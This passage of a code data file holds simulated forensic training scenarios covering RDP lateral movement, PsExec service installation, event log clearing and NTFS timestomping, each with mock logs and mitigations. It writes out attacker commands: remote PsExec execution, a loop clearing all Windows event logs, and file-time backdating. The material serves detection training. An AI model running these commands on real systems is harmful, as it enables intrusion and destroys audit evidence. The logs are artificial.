      'Grounded in SANS DFIR Poster (Windows RDP Forensics), Microsoft TerminalServices Event Log documentation, and MITRE ATT&CK T1021.001: an investigator reconstructs an interactive Remote Desktop lateral movement pivot across source and destination hosts by correlating RdpCoreTS EventID 131, Security EventID 4624 (LogonType 10), LocalSessionManager EventIDs 21/24/25, TerminalServices-RDPClient EventID 1024/1102, and client-side Bitmap Cache (cache*.bin / bmc) tiles.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Pivot Host WKS-07 (mstsc.exe)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Internal VLAN Router (:3389)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Target Server SRV-APP02 (TermService)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'LSM EID 21/24/25 & RdpCoreTS', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'BMC Cache & Default.rdp Registry', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Outbound mstsc.exe Connection, MRU Registry & RDPClient EventID 1024 / 1102 on Source Host',
        narration:
          'When the attacker launches mstsc.exe on source host WKS-07 (10.10.4.19) to connect to SRV-APP02 (10.10.20.45), Windows records the target IP/hostname in NTUSER.DAT (Software\\Microsoft\\Terminal Server Client\\Servers\\10.10.20.45\\UsernameHint) and logs EventID 1024 (RDP ClientActiveX is trying to connect) and EventID 1102 in Microsoft-Windows-TerminalServices-RDPClient/Operational.',
        activeNodes: ['attacker', 'firewall', 'ad'],
        mitreTactic: 'Lateral Movement (T1021.001 - Remote Services: Remote Desktop Protocol)',
        technicalCommands: [
          'mstsc.exe /v:10.10.20.45',
          'Registry Artifact: NTUSER.DAT\\Software\\Microsoft\\Terminal Server Client\\Servers\\10.10.20.45 (UsernameHint + CertHash)',
          'TerminalServices-RDPClient/Operational EventID 1024 & 1102 (Target IP 10.10.20.45)',
        ],
        defenseMitigation:
          'Collect Microsoft-Windows-TerminalServices-RDPClient/Operational logs from workstations and jump hosts to track outbound RDP destinations even if destination server logs are wiped.',
        logs: [
          {
            id: 'dfir-rdp-1',
            timestamp: '22:18:04.112',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 1024,
            ProcessName: 'mstsc.exe',
            CommandLine: 'mstsc.exe /v:10.10.20.45',
            raw: 'LogName: Microsoft-Windows-TerminalServices-RDPClient/Operational | EventID: 1024 | Computer: WKS-07.corp.local | Description: RDP ClientActiveX is trying to connect to the server (10.10.20.45) | NTUSER.DAT UsernameHint: CORP\\admin_db',
            parsedFields: {
              SourceHost: 'WKS-07.corp.local (10.10.4.19)',
              LogChannel: 'Microsoft-Windows-TerminalServices-RDPClient/Operational',
              EventID: '1024 (Connection Attempt) / 1102 (Server IP)',
              RegistryMru: 'Software\\Microsoft\\Terminal Server Client\\Servers\\10.10.20.45',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Destination Server NLA Logon (EventID 4624 Type 10 / 7), RdpCoreTS 131 & LSM EventID 21 / 25',
        narration:
          'On destination server SRV-APP02, Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational logs EventID 131 (Client IP:Port 10.10.4.19:54912), Security logs EventID 4624 (LogonType 10 RemoteInteractive or LogonType 7 when reconnecting to a locked session), and TerminalServices-LocalSessionManager/Operational logs EventID 21 (Session logon succeeded, Session ID 2) or EventID 25 (Session reconnection succeeded).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Lateral Movement (T1021.001 - Destination LSM EventID 21/24/25 & RdpCoreTS 131)',
        technicalCommands: [
          'RemoteDesktopServices-RdpCoreTS/Operational EventID 131: ClientIP=10.10.4.19:54912',
          'Security EventID 4624: LogonType=10 (RemoteInteractive) IpAddress=10.10.4.19',
          'TerminalServices-LocalSessionManager/Operational EventID 21 (Logon), 24 (Disconnected), 25 (Reconnected)',
        ],
        defenseMitigation:
          'Correlate Security EventID 4624 (LogonType 10 and LogonType 7) with TerminalServices-LocalSessionManager/Operational EventIDs 21 and 25 so RDP session reconnections (which log as Type 7 instead of Type 10) are never missed.',
        logs: [
          {
            id: 'dfir-rdp-2',
            timestamp: '22:18:05.340',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 21,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k NetworkService -s TermService (Session 2 Logon from 10.10.4.19)',
            raw: 'LogName: Microsoft-Windows-TerminalServices-LocalSessionManager/Operational | EventID: 21 | User: CORP\\admin_db | SessionID: 2 | Source Network Address: 10.10.4.19 | Correlated Security EventID 4624 LogonType=10 & RdpCoreTS EventID 131',
            parsedFields: {
              LogChannel: 'TerminalServices-LocalSessionManager/Operational',
              EventID: '21 (Session Logon) / 25 (Session Reconnect) / 24 (Disconnect)',
              SessionId: '2',
              SourceNetworkAddress: '10.10.4.19',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Client-Side RDP Bitmap Cache (Cache0000.bin / bmc2-tools) Visual Screen Reconstruction',
        narration:
          'During the interactive session on SRV-APP02, mstsc.exe on WKS-07 caches 64x64 pixel screen tiles inside %LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache\\Cache0000.bin (and bcache24.bmc). Using ANSSI bmc-tools and Rdpieces, DFIR analysts carve and reassemble the bitmap tiles from WKS-07 to visually reconstruct the exact GUI tools and commands the attacker ran on SRV-APP02.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Collection (T1021.001 - RDP Bitmap Cache Visual Reconstruction)',
        technicalCommands: [
          'Artifact Path: C:\\Users\\admin_db\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\Cache0000.bin',
          'python3 bmc-tools.py -s Cache0000.bin -d ./extracted_tiles -b',
          'perl rdpieces.pl ./extracted_tiles  # Reconstructs 64x64 pixel GUI frames from the RDP session',
        ],
        defenseMitigation:
          'Preserve %LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache\\*.bin and *.bmc on pivot hosts during incident response to recover visual evidence when destination servers are encrypted or wiped.',
        logs: [
          {
            id: 'dfir-rdp-3',
            timestamp: '22:24:10.900',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'mstsc.exe',
            CommandLine: 'mstsc.exe writing 64x64 RDP bitmap tiles to Cache0000.bin',
            raw: 'EventID: 11 | Computer: WKS-07.corp.local | Image: C:\\Windows\\System32\\mstsc.exe | TargetFilename: C:\\Users\\admin_db\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\Cache0000.bin | ForensicTool: ANSSI bmc-tools (3,412 64x64 bitmap tiles carved)',
            parsedFields: {
              ArtifactFile: '%LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache\\Cache0000.bin',
              TileDimensions: '64x64 Raw Bitmap Tiles',
              ForensicParser: 'ANSSI bmc-tools.py + Rdpieces',
              EvidentiaryValue: 'Visual reconstruction of attacker GUI actions on remote host',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-smb-psexec-named-pipe-eid5145-7045',
    title: 'Microsoft & CISA DFIR — SMB ADMIN$ Share, PSEXESVC Named Pipe & Service Install Forensics (EID 5145 / 7045)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1569.002',
    description:
      'Grounded in Microsoft Security Auditing Event ID 5145 & System Event ID 7045 specifications, CISA Advisory AA23-165A, and SigmaHQ rules: an attacker uses PsExec / Impacket smbexec to authenticate over SMB, write a service binary to the ADMIN$ share (EventID 5145), create a temporary Windows service (System EventID 7045 / Security EventID 4697), and redirect stdin/stdout/stderr over named pipes (Sysmon EventID 17 & 18).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Operator Host (PsExec.exe)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SMB :445 ADMIN$ & IPC$ Share', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'services.exe (SCM PID 612)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'EID 5145, 7045 & Sysmon EID 17/18', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'PSEXESVC.exe & Named Pipes', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SMB ADMIN$ Share Write & IPC$ svcctl RPC Bind (Security EventID 5140 & 5145)',
        narration:
          'The attacker executes PsExec.exe \\\\10.10.20.15 -s cmd.exe. The target host logs Security EventID 5140 (Network share object accessed) and EventID 5145 (Detailed File Share Access) showing WriteData (AccessMask 0x2) of PSEXESVC.exe into the \\\\*\\ADMIN$ share (C:\\Windows\\PSEXESVC.exe), followed by an IPC$ access to the svcctl named pipe.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Lateral Movement (T1021.002 - Remote Services: SMB/Windows Admin Shares)',
        technicalCommands: [
          'PsExec.exe -accepteula \\\\10.10.20.15 -s cmd.exe',
          'Security EventID 5145: ShareName=\\\\*\\ADMIN$ RelativeTargetName=PSEXESVC.exe AccessMask=0x2 (WriteData)',
          'Security EventID 5145: ShareName=\\\\*\\IPC$ RelativeTargetName=svcctl',
        ],
        defenseMitigation:
          'Enable Audit Detailed File Share (EventID 5145) and restrict inbound SMB (TCP 445) between workstation subnets and across administrative tiers.',
        logs: [
          {
            id: 'dfir-psexec-1',
            timestamp: '13:05:10.115',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 5145,
            ProcessName: 'System',
            CommandLine: 'SMB2 Write \\\\*\\ADMIN$\\PSEXESVC.exe & IPC$\\svcctl bind',
            raw: 'EventID: 5145 | SubjectUserName: admin_ops | IpAddress: 10.10.4.15 | ShareName: \\\\*\\ADMIN$ | ShareLocalPath: \\??\\C:\\Windows | RelativeTargetName: PSEXESVC.exe | AccessMask: 0x2 (WriteData / AddFile)',
            parsedFields: {
              EventID: '5145 (Detailed File Share Audit)',
              ShareName: '\\\\*\\ADMIN$ (C:\\Windows)',
              RelativeTargetName: 'PSEXESVC.exe',
              AccessMask: '0x2 (WriteData)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Remote Service Installation via SCM CreateServiceW (System EventID 7045 & Security EventID 4697)',
        narration:
          'Over the \\pipe\\svcctl RPC interface, the Service Control Manager (services.exe) invokes CreateServiceW and logs System EventID 7045 (A service was installed in the system) and Security EventID 4697 with ServiceName="PSEXESVC", ImagePath="%SystemRoot%\\PSEXESVC.exe", ServiceType="user mode service" (0x10), and StartType="demand start" (0x3).',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1569.002 - System Services: Service Execution)',
        technicalCommands: [
          'RPC svcctl: RCreateServiceW(lpServiceName="PSEXESVC", lpBinaryPathName="%SystemRoot%\\PSEXESVC.exe")',
          'System EventID 7045: Service Name=PSEXESVC, Service File Name=%SystemRoot%\\PSEXESVC.exe, Account Name=LocalSystem',
        ],
        defenseMitigation:
          'Alert on System EventID 7045 and Security EventID 4697 where ServiceFileName references %SystemRoot%, ADMIN$, cmd.exe /c, powershell.exe, or random 8-character service names (Impacket smbexec/psexec).',
        logs: [
          {
            id: 'dfir-psexec-2',
            timestamp: '13:05:10.480',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 7045,
            ProcessName: 'services.exe',
            CommandLine: '%SystemRoot%\\PSEXESVC.exe',
            raw: 'LogName: System | Source: Service Control Manager | EventID: 7045 | Service Name: PSEXESVC | Service File Name: %SystemRoot%\\PSEXESVC.exe | Service Type: user mode service | Service Start Type: demand start | Service Account: LocalSystem',
            parsedFields: {
              EventID: '7045 (System SCM) / 4697 (Security)',
              ServiceName: 'PSEXESVC',
              ServiceFileName: '%SystemRoot%\\PSEXESVC.exe',
              ServiceAccount: 'LocalSystem',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Named Pipe Stdin/Stdout/Stderr Redirection (Sysmon EventID 17 & 18)',
        narration:
          'Even if the attacker renames the binary using PsExec -r, PSEXESVC.exe creates a control pipe and three I/O redirection named pipes matching \\PSEXESVC-<Host>-<PID>-stdin, -stdout, and -stderr. Sysmon EventID 17 (PipeCreated) and EventID 18 (PipeConnected) capture the exact PipeName and Image regardless of service renaming.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Execution (T1569.002 - Sysmon EventID 17/18 Named Pipe Forensics)',
        technicalCommands: [
          'Sysmon EventID 17 (PipeCreated): PipeName=\\PSEXESVC-WKS04-3104-stdin',
          'Sysmon EventID 17 (PipeCreated): PipeName=\\PSEXESVC-WKS04-3104-stdout',
          'Sysmon EventID 18 (PipeConnected): Image=C:\\Windows\\PSEXESVC.exe',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 17 and EventID 18 for named pipes ending in -stdin, -stdout, -stderr, or matching \\RemCom_communicaton, \\csexec, and \\paexec.',
        logs: [
          {
            id: 'dfir-psexec-3',
            timestamp: '13:05:10.812',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 17,
            ProcessName: 'PSEXESVC.exe',
            CommandLine: 'C:\\Windows\\PSEXESVC.exe creating \\PSEXESVC-WKS04-3104-stdin',
            raw: 'EventID: 17 | EventType: CreatePipe | ProcessId: 4412 | PipeName: \\PSEXESVC-WKS04-3104-stdin | Image: C:\\Windows\\PSEXESVC.exe | Correlated EventID 18 (ConnectPipe): \\PSEXESVC-WKS04-3104-stdout',
            parsedFields: {
              EventID: '17 (PipeCreated) / 18 (PipeConnected)',
              Image: 'C:\\Windows\\PSEXESVC.exe',
              PipeNamePattern: '\\PSEXESVC-<HOST>-<PID>-{stdin,stdout,stderr}',
              SpawnedChildProcess: 'C:\\Windows\\System32\\cmd.exe (NT AUTHORITY\\SYSTEM)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-evtx-log-clearing-wevtutil-eid1102-104',
    title: 'NIST SP 800-86 & Microsoft DFIR — Event Log Clearing via wevtutil.exe & USN Journal Recovery (EID 1102 / 104)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1070.001',
    description:
      'Grounded in NIST SP 800-86 (Guide to Integrating Forensic Techniques into Incident Response), Microsoft Security Event ID 1102 / System Event ID 104 specifications, and MITRE ATT&CK T1070.001: an adversary attempts anti-forensics by wiping Security.evtx, System.evtx, and Microsoft-Windows-Sysmon%4Operational.evtx via wevtutil.exe cl or Clear-EventLog, generating immutable clearing events (1102/104) while leaving unallocated EVTX record slack and NTFS $UsnJrnl:$J transactions behind.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Cleanup Script', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'EventLog RPC (EvtClearLog)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'svchost.exe (EventLog Service)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Security EID 1102 & System 104', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'NTFS $UsnJrnl:$J & EVTX Slack', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Mass Channel Enumeration & wevtutil.exe cl Execution (Sysmon EventID 1)',
        narration:
          'To erase post-exploitation traces before disconnecting, the attacker runs cmd.exe /c "for /F %i in (\'wevtutil.exe el\') do wevtutil.exe cl \"%i\"" or PowerShell Clear-EventLog. Real-time SIEM forwarding captures the Sysmon EventID 1 / Security EventID 4688 process creation before the local .evtx files on disk are truncated.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1070.001 - Indicator Removal: Clear Windows Event Logs)',
        technicalCommands: [
          'for /F "tokens=*" %1 in (\'wevtutil.exe el\') do wevtutil.exe cl "%1"',
          'powershell.exe -Command "Get-WinEvent -ListLog * | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }"',
        ],
        defenseMitigation:
          'Stream Windows Event Logs in real time via Windows Event Forwarding (WEF) or an EDR/SIEM agent so local .evtx truncation cannot erase already-forwarded telemetry.',
        logs: [
          {
            id: 'dfir-evtx-1',
            timestamp: '03:55:01.102',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'wevtutil.exe',
            CommandLine: 'wevtutil.exe cl Security',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\wevtutil.exe | CommandLine: wevtutil.exe cl Security | ParentImage: C:\\Windows\\System32\\cmd.exe | User: CORP\\admin_ops',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              Image: 'C:\\Windows\\System32\\wevtutil.exe',
              CommandLine: 'wevtutil.exe cl Security',
              ApiInvoked: 'wevtapi.dll!EvtClearLog',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Immutable Audit Log Cleared Events (Security EventID 1102 & System EventID 104)',
        narration:
          'When svchost.exe (-k LocalServiceNetworkRestricted -s EventLog) executes EvtClearLog on C:\\Windows\\System32\\winevt\\Logs\\Security.evtx, the kernel immediately writes a fresh first record into the cleared Security log: EventID 1102 (The audit log was cleared, Provider: Microsoft-Windows-Eventlog) containing the SubjectUserSid and SubjectUserName. Clearing any other channel (such as System or Sysmon) writes EventID 104 into System.evtx.',
        activeNodes: ['target', 'siem', 'ad'],
        mitreTactic: 'Defense Evasion (T1070.001 - EventID 1102 & EventID 104 Sentinel Records)',
        technicalCommands: [
          'Security EventID 1102 (Microsoft-Windows-Eventlog): The audit log was cleared. SubjectUserName=admin_ops',
          'System EventID 104 (Microsoft-Windows-Eventlog): The Microsoft-Windows-Sysmon/Operational log file was cleared.',
        ],
        defenseMitigation:
          'Treat Security EventID 1102 and System EventID 104 as critical P1 incident triggers and automatically isolate the host for memory and disk acquisition.',
        logs: [
          {
            id: 'dfir-evtx-2',
            timestamp: '03:55:01.450',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 1102,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog (EvtClearLog)',
            raw: 'LogName: Security | Source: Microsoft-Windows-Eventlog | EventID: 1102 | UserData: <LogFileCleared><SubjectUserSid>S-1-5-21-3819201-1104</SubjectUserSid><SubjectUserName>admin_ops</SubjectUserName><SubjectDomainName>CORP</SubjectDomainName></LogFileCleared> | Correlated System EventID 104',
            parsedFields: {
              SecurityEventID: '1102 (The audit log was cleared)',
              SystemEventID: '104 (Event log channel cleared)',
              SubjectUserName: 'CORP\\admin_ops',
              ClearedChannel: 'Security & Microsoft-Windows-Sysmon/Operational',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: NTFS $UsnJrnl:$J Transaction Correlation & Unallocated EVTX Chunk Carving (ElfChnk)',
        narration:
          'During disk forensics, the analyst parses the NTFS Change Journal ($Extend\\$UsnJrnl:$J) showing USN_REASON_DATA_TRUNCATION (0x00000200) on Security.evtx at 03:55:01 UTC, and carves unallocated NTFS clusters and Volume Shadow Copies for 64KB EVTX chunk headers ("ElfChnk\\x00", hex 45 6C 66 43 68 6E 6B 00) and binary XML record magic (0x00002a2a "**\\x00\\x00") using evtx_tract.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1070.001 - NTFS $UsnJrnl:$J & ElfChnk Carving)',
        technicalCommands: [
          'MFTECmd.exe -f "C:\\$Extend\\$UsnJrnl:$J" --csv C:\\Forensics  # Shows USN_REASON_DATA_TRUNCATION on Security.evtx',
          'EVTX 64KB Chunk Header Magic: 45 6C 66 43 68 6E 6B 00 ("ElfChnk\\x00")',
          'EVTX Record Header Magic: 2A 2A 00 00 ("**\\x00\\x00") carved from unallocated clusters',
        ],
        defenseMitigation:
          'Acquire a raw physical disk image immediately upon detecting EventID 1102/104 before TRIM or new disk writes overwrite unallocated 64KB ElfChnk clusters.',
        logs: [
          {
            id: 'dfir-evtx-3',
            timestamp: '03:55:01.460',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 200,
            ProcessName: 'MFTECmd.exe',
            CommandLine: 'MFTECmd.exe -f C:\\$Extend\\$UsnJrnl:$J (USN_REASON_DATA_TRUNCATION on Security.evtx)',
            raw: 'USN_RECORD_V2: FileName="Security.evtx" ParentEntryNumber=18422 Usn=8491029384 TimeStamp="2026-11-03 03:55:01.452" Reason="DataOverwrite | DataTruncation (0x00000201)" | Carved ElfChnk (456C6643686E6B00): 412 records recovered',
            parsedFields: {
              NtfsArtifact: 'C:\\$Extend\\$UsnJrnl:$J (Update Sequence Number Journal)',
              UsnReasonFlag: 'USN_REASON_DATA_TRUNCATION (0x00000200)',
              EvtxChunkMagic: '45 6C 66 43 68 6E 6B 00 (ElfChnk\\x00)',
              EvtxRecordMagic: '2A 2A 00 00 (**\\x00\\x00)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-ntfs-timestomp-mft-si-fn-mismatch-eid2',
    title: 'SANS DFIR & Microsoft Sysmon — NTFS $MFT $STANDARD_INFORMATION vs $FILE_NAME Timestomping (Sysmon EventID 2)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1070.006',
    description:
      'Grounded in SANS FOR508 NTFS Master File Table ($MFT) analysis, Microsoft Sysinternals Sysmon Event ID 2 specifications, and MITRE ATT&CK T1070.006: a malware dropper calls NtSetInformationFile (FileBasicInformation) to backdate a newly dropped binary to match kernel32.dll, modifying the $STANDARD_INFORMATION (0x10) attribute while leaving the kernel-managed $FILE_NAME (0x30) attribute and $UsnJrnl:$J creation timestamp at the true drop time.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Malware Dropper Process', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'ntdll!NtSetInformationFile', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Ntfs.sys Driver ($MFT Record)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 2 & MFTECmd Parser', type: 'siem', status: 'normal' },
      { id: 'ad', label: '$STANDARD_INFO vs $FILE_NAME', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Payload Drop & True Creation Timestamp in $MFT $FILE_NAME (0x30) Attribute (Sysmon EventID 11)',
        narration:
          'When the dropper creates C:\\Windows\\System32\\winhttp_helper.dll at 2026-11-03 16:40:12.8491023 UTC, the NTFS filesystem driver (Ntfs.sys) allocates an $MFT record and populates both the $STANDARD_INFORMATION (attribute 0x10) and $FILE_NAME (attribute 0x30) MACB timestamps with full 100-nanosecond FILETIME precision.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1070.006 - Indicator Removal: Timestomp)',
        technicalCommands: [
          'NtCreateFile("C:\\Windows\\System32\\winhttp_helper.dll")',
          'MFT Attribute 0x10 ($STANDARD_INFORMATION) Created: 2026-11-03 16:40:12.8491023 UTC',
          'MFT Attribute 0x30 ($FILE_NAME) Created: 2026-11-03 16:40:12.8491023 UTC',
        ],
        defenseMitigation:
          'Enable Sysmon EventID 11 (FileCreate) and EventID 2 (FileCreateTime) across all system directories.',
        logs: [
          {
            id: 'dfir-timestomp-1',
            timestamp: '16:40:12.849',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'updater_svc.exe',
            CommandLine: 'updater_svc.exe dropping C:\\Windows\\System32\\winhttp_helper.dll',
            raw: 'EventID: 11 | Image: C:\\Users\\Public\\updater_svc.exe | TargetFilename: C:\\Windows\\System32\\winhttp_helper.dll | CreationUtcTime: 2026-11-03 16:40:12.849',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate)',
              TargetFilename: 'C:\\Windows\\System32\\winhttp_helper.dll',
              TrueCreationUtcTime: '2026-11-03 16:40:12.8491023 UTC',
              MftEntryNumber: '94102',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: User-Mode NtSetInformationFile Timestomping & Sysmon EventID 2 Detection',
        narration:
          'The dropper invokes SetFileTime / NtSetInformationFile(FileBasicInformation) or PowerShell (Get-Item winhttp_helper.dll).CreationTime = "2022-05-07 09:00:00" to blend in with legitimate OS binaries. Sysmon EventID 2 (A process changed a file creation time) immediately logs both the forged CreationUtcTime (2022-05-07) and the true PreviousCreationUtcTime (2026-11-03).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1070.006 - Sysmon EventID 2 FileCreateTime Changed)',
        technicalCommands: [
          'NtSetInformationFile(hFile, &ioStatus, &fileBasicInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation)',
          'Sysmon EventID 2: TargetFilename=C:\\Windows\\System32\\winhttp_helper.dll CreationUtcTime=2022-05-07 09:00:00.000 PreviousCreationUtcTime=2026-11-03 16:40:12.849',
        ],
        defenseMitigation:
          'Alert on Sysmon EventID 2 where TargetFilename resides in C:\\Windows\\, C:\\ProgramData\\, or C:\\Users\\ and CreationUtcTime is backdated by more than 24 hours.',
        logs: [
          {
            id: 'dfir-timestomp-2',
            timestamp: '16:40:13.012',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 2,
            ProcessName: 'updater_svc.exe',
            CommandLine: 'NtSetInformationFile(FileBasicInformation) backdating winhttp_helper.dll to 2022-05-07',
            raw: 'EventID: 2 | Image: C:\\Users\\Public\\updater_svc.exe | TargetFilename: C:\\Windows\\System32\\winhttp_helper.dll | CreationUtcTime: 2022-05-07 09:00:00.000 | PreviousCreationUtcTime: 2026-11-03 16:40:12.849',
            parsedFields: {
              EventID: '2 (Sysmon FileCreateTime Changed)',
              TargetFilename: 'C:\\Windows\\System32\\winhttp_helper.dll',
              ForgedCreationUtcTime: '2022-05-07 09:00:00.000',
              PreviousCreationUtcTime: '2026-11-03 16:40:12.849',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Offline $MFT $SI < $FN Anomaly & Sub-Second Nanosecond Zeroing Analysis (MFTECmd)',
        narration:
          'Because user-mode Win32/NT APIs only modify the $STANDARD_INFORMATION (0x10) attribute while $FILE_NAME (0x30) is updated strictly by the NTFS kernel driver on file creation/move/rename, parsing C:\\$MFT with MFTECmd reveals a classic "$SI < $FN" discrepancy ($SI Created = 2022-05-07 09:00:00.0000000 with zeroed fractional seconds vs $FN Created = 2026-11-03 16:40:12.8491023).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1070.006 - $MFT $STANDARD_INFORMATION vs $FILE_NAME Discrepancy)',
        technicalCommands: [
          'MFTECmd.exe -f "C:\\$MFT" --csv C:\\Forensics --csvf mft_parsed.csv',
          '$SI Created0x10: 2022-05-07 09:00:00.0000000 (Zeroed sub-second nanoseconds)',
          '$FN Created0x30: 2026-11-03 16:40:12.8491023 (Kernel-protected true creation time)',
        ],
        defenseMitigation:
          'During offline NTFS disk triage, flag any $MFT record in System32 where Created0x10 < Created0x30 or where Created0x10 has exact .0000000 sub-second fractional zeros.',
        logs: [
          {
            id: 'dfir-timestomp-3',
            timestamp: '16:45:00.100',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 94102,
            ProcessName: 'MFTECmd.exe',
            CommandLine: 'MFTECmd.exe -f C:\\$MFT (Entry 94102: Created0x10 < Created0x30 & Sub-Second Zeroing)',
            raw: 'MFT_RECORD: EntryNumber=94102 FileName="winhttp_helper.dll" InUse=True Created0x10="2022-05-07 09:00:00.0000000" Created0x30="2026-11-03 16:40:12.8491023" uSecZeros=True',
            parsedFields: {
              ForensicArtifact: 'C:\\$MFT (Master File Table Entry #94102)',
              StandardInfo0x10: '2022-05-07 09:00:00.0000000 (uSecZeros=True)',
              FileName0x30: '2026-11-03 16:40:12.8491023 (True Drop Timestamp)',
              AnomalyClassification: '$SI < $FN Timestomp + Sub-Second Nanosecond Zeroing',
            },
          },
        ],
      },
    ],
  },
];
